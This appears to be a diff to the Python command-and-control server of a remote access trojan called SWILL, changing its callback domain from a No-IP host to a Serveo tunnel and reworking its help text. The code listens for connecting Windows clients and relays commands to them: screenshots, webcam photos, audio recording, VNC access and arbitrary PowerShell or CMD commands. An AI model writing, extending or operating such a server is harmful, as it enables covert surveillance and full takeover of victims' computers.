@@ -18,9 +18,8 @@ class SWILLServer:
         server.listen(10)
         
         print(f"🖥️  [SWILL] Control Server Started on {self.control_port}")
-        print(f"🌐 [SWILL] Server Domain: herculles.ddns.net")
+        print(f"🌐 [SWILL] Serveo Domain: swill.serveo.net")
         print(f"🔗 [SWILL] Ready for connections...")
-        print(f"📱 [SWILL] Running on Termux + No-IP")
         
         while True:
             client_socket, client_address = server.accept()
@@ -42,7 +41,7 @@ class SWILLServer:
     
     def handle_windows_client(self, client_socket, client_address, client_id):
         try:
-            client_socket.send(b"[SWILL] Connected to Termux Server\n")
+            client_socket.send(b"[SWILL] Connected to Serveo Server\n")
             
             while True:
                 client_socket.send(b"SWILL> ")
@@ -76,7 +75,20 @@ class SWILLServer:
                 elif command.lower() == 'vnc_status':
                     client_socket.send(b'tasklist | findstr /i vnc && netstat -an | findstr :5900')
                 elif command.lower() == 'help':
-                    print("Available commands: system_info, whoami, ipconfig, files_list, screenshot, webcam_capture, record_audio, tasklist, vnc_connect, vnc_status")
+                    print("""
+🎮 CLIENT COMMANDS:
+• system_info - System information
+• whoami - Current user
+• ipconfig - Network info
+• files_list - List files
+• screenshot - Capture screen
+• webcam_capture - Webcam photo
+• record_audio - Record audio
+• tasklist - Running processes
+• vnc_connect - VNC access info
+• vnc_status - Check VNC status
+• Any PowerShell/CMD command
+                    """)
                     continue
                 else:
                     client_socket.send(command.encode())
@@ -145,8 +157,7 @@ class SWILLServer:
             print(f"  {client_id} - {info['address']}")
     
     def start(self):
-        print("🚀 Starting SWILL Server on Termux...")
-        print("📡 Using No-IP Domain: herculles.ddns.net")
+        print("🚀 Starting SWILL Server with Serveo...")
         
         control_thread = threading.Thread(target=self.start_control_server)
         media_thread = threading.Thread(target=self.start_media_server)
@@ -165,24 +176,7 @@ class SWILLServer:
                 if cmd == "clients":
                     self.show_clients()
                 elif cmd == "help":
-                    print("""
-📋 SERVER COMMANDS:
-• clients - Show connected clients
-• exit - Shutdown server
-
-🎮 CLIENT COMMANDS (when client connected):
-• system_info - System information
-• whoami - Current user
-• ipconfig - Network info
-• files_list - List files
-• screenshot - Capture screen
-• webcam_capture - Webcam photo
-• record_audio - Record audio
-• tasklist - Running processes
-• vnc_connect - VNC access info
-• vnc_status - Check VNC status
-• Any PowerShell/CMD command
-                    """)
+                    print("📋 SERVER COMMANDS: clients, help, exit")
                 elif cmd == "exit":
                     break
                 else:
